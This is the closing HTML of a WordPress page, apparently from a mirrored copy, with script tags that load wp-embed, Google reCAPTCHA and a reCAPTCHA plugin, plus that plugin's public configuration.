<script type='text/javascript' src='../../../../wp-includes/js/wp-embed.min.js@ver=4.8.11'></script>
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?onload=renderUNCRReCaptcha&amp;render=explicit&amp;ver=2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var UNCR = {"site_key":"6LdjjAcUAAAAAOtl-qenrmS-_KhXjvuODKgVRuyS","key_type":"normal","theme":"dark","type":"image","submit_button":"no"};
/* ]]> */
</script>
<script type='text/javascript' src='../../../../wp-content/plugins/uber-nocaptcha-recaptcha/assets/js/recaptcha.js@ver=1.0'></script>
</body>
</html>